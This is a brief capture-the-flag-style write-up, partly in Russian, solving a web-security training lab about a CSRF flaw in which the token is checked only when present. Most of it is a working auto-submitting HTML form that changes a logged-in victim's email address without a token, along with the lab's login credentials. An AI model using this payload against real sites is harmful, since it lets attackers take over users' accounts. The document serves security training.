# CSRF where token validation depends on token being present
PRACTITIONER

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

## Решение
Решение без токена работает:
```
<html>
<body>
    <form action="https://0a2d0071037ce7b783207ea8001d00a2.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="wiener123@normal-user.net" />
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
```
Deliver exploit to victim -> задание выполнено.
